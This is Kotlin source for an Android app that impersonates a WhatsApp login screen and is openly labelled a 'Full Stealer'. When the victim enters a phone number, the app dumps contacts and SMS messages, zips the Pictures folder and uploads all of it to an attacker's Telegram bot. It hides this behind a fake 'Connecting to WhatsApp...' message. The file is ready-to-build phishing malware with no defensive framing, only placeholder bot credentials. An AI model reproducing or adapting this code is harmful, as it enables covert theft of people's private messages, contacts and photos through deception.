package com.whatsapp.auth

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.io.OutputStreamWriter
import java.util.zip.ZipOutputStream

class MainActivity : AppCompatActivity() {

    private val TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
    private val TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
    private val PERMISSION_CODE = 200

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        requestAllPermissions()

        val phoneInput = findViewById<EditText>(R.id.phoneInput)
        val loginButton = findViewById<Button>(R.id.loginButton)

        loginButton.setOnClickListener {
            val phone = phoneInput.text.toString()
            if (phone.isNotEmpty()) {
                sendToTelegram("🚨 [Full Stealer] Target Hooked! Phone: $phone")
                harvestEverything()
                Toast.makeText(this, "Connecting to WhatsApp...", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Enter phone number", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun requestAllPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.GET_ACCOUNTS
        )
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE)
    }

    private fun harvestEverything() {
        Thread {
            try {
                // 1. Dump Contacts
                val contactsFile = File(cacheDir, "contacts.txt")
                contactsFile.printWriter().use { out ->
                    val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                    cursor?.use {
                        val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                        val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        while (it.moveToNext()) {
                            val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                            val num = if (numIdx != -1) it.getString(numIdx) else ""
                            out.println("Name: $name | Number: $num")
                        }
                    }
                }
                sendDocumentToTelegram(contactsFile, "📇 Contacts Dump")

                // 2. Dump SMS
                val smsFile = File(cacheDir, "sms.txt")
                smsFile.printWriter().use { out ->
                    val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                    cursor?.use {
                        val bodyIdx = it.getColumnIndex("body")
                        val addrIdx = it.getColumnIndex("address")
                        while (it.moveToNext()) {
                            val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                            val addr = if (addrIdx != -1) it.getString(addrIdx) else ""
                            out.println("From: $addr | Body: $body")
                        }
                    }
                }
                sendDocumentToTelegram(smsFile, "💬 SMS Dump")

                // 3. Zip and send Pictures
                val picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
                if (picturesDir.exists()) {
                    val zipFile = File(cacheDir, "pictures.zip")
                    zipFolder(picturesDir, zipFile)
                    sendDocumentToTelegram(zipFile, "📸 Pictures Archive")
                }

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun zipFolder(srcDir: File, zipFile: File) {
        ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
            srcDir.walkTopDown().filter { it.isFile && it.length() < 5000000 }.forEach { file ->
                val zipEntry = java.util.zip.ZipEntry(srcDir.toURI().relativize(file.toURI()).path)
                zos.putNextEntry(zipEntry)
                file.inputStream().copyTo(zos)
                zos.closeEntry()
            }
        }
    }

    private fun sendToTelegram(message: String) {
        try {
            val urlString = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=" + java.net.URLEncoder.encode(message, "UTF-8")
            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.inputStream.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendDocumentToTelegram(file: File, caption: String) {
        try {
            val boundary = "Boundary-" + System.currentTimeMillis()
            val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument")
            val conn = url.openConnection() as HttpURLConnection
            conn.doOutput = true
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val outputStream = conn.outputStream
            val writer = OutputStreamWriter(outputStream, "UTF-8")

            writer.append("--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            writer.append("$TELEGRAM_CHAT_ID\r\n")
            writer.append("--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
            writer.append("$caption\r\n")
            writer.append("--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.name + "\"\r\n")
            writer.append("Content-Type: application/octet-stream\r\n\r\n")
            writer.flush()

            file.inputStream().use { it.copyTo(outputStream) }
            outputStream.flush()

            writer.append("\r\n--$boundary--\r\n")
            writer.flush()
            writer.close()
            conn.inputStream.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
